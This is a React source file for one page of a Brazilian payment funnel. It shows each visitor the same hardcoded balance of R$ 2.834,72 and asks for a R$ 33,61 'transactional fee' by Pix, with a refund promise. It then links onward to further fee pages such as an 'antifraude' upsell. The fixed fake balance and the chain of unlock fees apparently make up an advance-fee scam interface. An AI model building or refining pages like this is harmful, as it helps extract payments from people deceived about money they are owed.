import { useCallback } from "react";
import { Link, useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, ArrowRight } from "lucide-react";
import FunnelUpsellTransacional from "@/components/funnel/FunnelUpsellTransacional";
import FunnelProcessingScreen from "@/components/funnel/FunnelProcessingScreen";
import FunnelPixPopup from "@/components/funnel/FunnelPixPopup";
import { usePaymentFlow } from "@/hooks/usePaymentFlow";

interface LocationState { pixKey?: string; pixKeyType?: string; }

const FunnelUpsellTransacionalPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;
  const leadPixKey = state?.pixKey || "";
  const leadPixKeyType = state?.pixKeyType || "E-mail";

  const handleProcessingComplete = useCallback(() => {
    navigate('/funil/upsell-antifraude', { state: { pixKey: leadPixKey, pixKeyType: leadPixKeyType } });
  }, [navigate, leadPixKey, leadPixKeyType]);

  const flow = usePaymentFlow({
    contentId: 'upsell_transacional',
    paymentType: 'upsell_transacional',
    amount: 33.61,
    onProcessingComplete: handleProcessingComplete,
  });

  if (flow.showProcessing) {
    return <FunnelProcessingScreen onComplete={handleProcessingComplete} />;
  }

  return (
    <div className="min-h-screen bg-black/50 flex flex-col items-center justify-end pb-0">
      <div className="w-full max-w-md">
        <div className="flex justify-between px-4 mb-2">
          <Link to="/funil/upsell-tenf" state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }} className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full">
            <ArrowLeft className="w-4 h-4" /> Anterior
          </Link>
          <Link to="/funil/upsell-antifraude" state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }} className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full">
            Próximo <ArrowRight className="w-4 h-4" />
          </Link>
        </div>
        <FunnelUpsellTransacional
          balance="R$ 2.834,72"
          pixName={flow.leadName || "Usuário"}
          pixKey={leadPixKey}
          onGeneratePix={() => flow.handleGeneratePix(leadPixKey, leadPixKeyType)}
          isGenerating={flow.isGenerating}
          leadCpf={flow.leadCpf}
          leadName={flow.leadName}
        />
      </div>

      {flow.showPixPopup && flow.pixData && (
        <FunnelPixPopup
          pixData={flow.pixData}
          onClose={() => flow.setShowPixPopup(false)}
          onCopy={flow.handleCopyPixCode}
          isCopied={flow.pixCopied}
          title="Taxa Transacional"
          amount="R$ 33,61"
          showRefundMessage
          onManualCheck={flow.checkPayment}
          isCheckingPayment={flow.isChecking}
          checkError={flow.checkError}
        />
      )}
    </div>
  );
};

export default FunnelUpsellTransacionalPage;